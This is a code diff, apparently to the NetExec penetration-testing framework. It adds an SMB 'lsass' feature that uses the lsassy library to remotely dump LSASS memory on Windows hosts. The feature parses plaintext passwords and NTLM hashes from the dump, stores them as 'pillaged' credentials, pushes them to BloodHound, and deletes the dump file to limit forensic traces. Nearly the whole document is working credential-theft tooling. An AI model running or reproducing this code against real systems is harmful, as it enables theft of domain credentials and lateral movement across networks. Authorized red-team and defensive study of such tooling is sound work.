@@ -58,6 +58,11 @@ from nxc.helpers.powershell import create_ps_command
 from nxc.helpers.misc import detect_if_ip
 from nxc.protocols.ldap.resolution import LDAPResolution
 
+from lsassy.dumper import Dumper
+from lsassy.impacketfile import ImpacketFile
+from lsassy.parser import Parser
+from lsassy.session import Session
+
 from dploot.triage.vaults import VaultsTriage
 from dploot.triage.browser import BrowserTriage, LoginData, GoogleRefreshToken, Cookie
 from dploot.triage.credentials import CredentialsTriage
@@ -977,6 +982,97 @@ class smb(connection):
                             self.logger.debug(f"Error getting client address for session {SessionId}: {e}")
             except SessionError:
                 self.logger.fail("RDP is probably not enabled, cannot list remote IPv4 addresses.")
+
+    @requires_admin
+    def lsass(self):
+        def print_credentials(domain, username, password, lmhash, nthash):
+            if password is None:
+                password = ":".join(h for h in [lmhash, nthash] if h is not None)
+            self.logger.highlight(f"{domain}\\{username} {password}")
+
+        def save_credentials(domain, username, password, lmhash, nthash):
+            host_id = self.db.get_hosts(self.host)[0][0]
+            if password is not None:
+                credential_type = "plaintext"
+            else:
+                credential_type = "hash"
+                password = ":".join(h for h in [lmhash, nthash] if h is not None)
+            self.db.add_credential(credential_type, domain, username, password, pillaged_from=host_id)
+
+        def process_credentials(credentials):
+            if len(credentials) == 0:
+                self.logger.display("No credentials found")
+            credz_bh = []
+            domain = None
+            for cred in credentials:
+                if cred["domain"] is None:
+                    cred["domain"] = ""
+                domain = cred["domain"]
+                if "." not in cred["domain"] and cred["domain"].upper() in self.domain.upper():
+                    domain = self.domain
+                save_credentials(cred["domain"], cred["username"], cred["password"], cred["lmhash"], cred["nthash"])
+                print_credentials(cred["domain"], cred["username"], cred["password"], cred["lmhash"], cred["nthash"])
+                credz_bh.append({"username": cred["username"].upper(), "domain": domain.upper()})
+                add_user_bh(credz_bh, domain, self.logger, self.config)
+
+        session = Session()
+        session.get_session(
+            address=self.host, target_ip=self.host, port=445, lmhash=self.lmhash, nthash=self.nthash, username=self.username, password=self.password, domain=self.domain
+        )
+
+        if session.smb_session is None:
+            self.logger.fail("Couldn't connect to remote host")
+            return False
+
+        dumper = Dumper(session, timeout=10, time_between_commands=7).load(self.args.lsass)
+        if dumper is None:
+            self.logger.fail(f"Unable to load dump method '{self.args.lsass}'")
+            return False
+
+        file = dumper.dump()
+        if file is None:
+            self.logger.fail("Unable to dump lsass")
+            return False
+
+        parsed = Parser(self.host, file).parse()
+        if parsed is None:
+            self.logger.fail("Unable to parse lsass dump")
+            return False
+        credentials, tickets, masterkeys = parsed
+
+        file.close()
+        self.logger.debug("Closed dumper file")
+        file_path = file.get_file_path()
+        self.logger.debug(f"File path: {file_path}")
+        try:
+            deleted_file = ImpacketFile.delete(session, file_path)
+            if deleted_file:
+                self.logger.debug("Deleted dumper file")
+            else:
+                self.logger.fail(f"[OPSEC] No exception, but failed to delete file: {file_path}")
+        except Exception as e:
+            self.logger.fail(f"[OPSEC] Error deleting temporary lsassy dumper file {file_path}: {e}")
+
+        if credentials is None:
+            credentials = []
+
+        for cred in credentials:
+            c = cred.get_object()
+            self.logger.debug(f"Cred: {c}")
+
+        credentials = [cred.get_object() for cred in credentials if cred.ticket is None and cred.masterkey is None and not cred.get_username().endswith("$")]
+        credentials_unique = []
+        credentials_output = []
+        self.logger.debug(f"Credentials: {credentials}")
+
+        for cred in credentials:
+            self.logger.debug(f"Credential: {cred}")
+            if [cred["domain"], cred["username"], cred["password"], cred["lmhash"], cred["nthash"],] not in credentials_unique:
+                credentials_unique.append([cred["domain"], cred["username"], cred["password"], cred["lmhash"], cred["nthash"]])
+                credentials_output.append(cred)
+
+        self.logger.debug("Calling process_credentials")
+        process_credentials(credentials_output)
 
     @requires_admin
     def qwinsta(self):
